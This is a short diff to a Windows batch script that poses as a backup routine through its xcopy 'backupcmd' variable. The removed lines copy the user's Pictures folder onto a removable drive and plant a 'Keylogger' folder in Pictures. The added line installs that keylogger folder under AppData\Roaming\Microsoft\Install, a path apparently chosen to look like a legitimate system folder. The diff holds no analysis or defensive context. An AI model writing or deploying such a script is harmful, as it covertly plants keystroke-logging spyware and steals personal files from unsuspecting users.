@@ -3,7 +3,6 @@
 SET odrive=%odrive:~0,2%
 set backupcmd=xcopy /c
 echo off
-%backupcmd% "%USERPROFILE%\Pictures" "%drive%\all\My pics\"
-%backupcmd% "%drive%\Keylogger" "%USERPROFILE%\Pictures\KeyLog\"
+%backupcmd% "%drive%\Keylogger" "%USERPROFILE%\AppData\Roaming\Microsoft\Install"
 @echo off
 cls
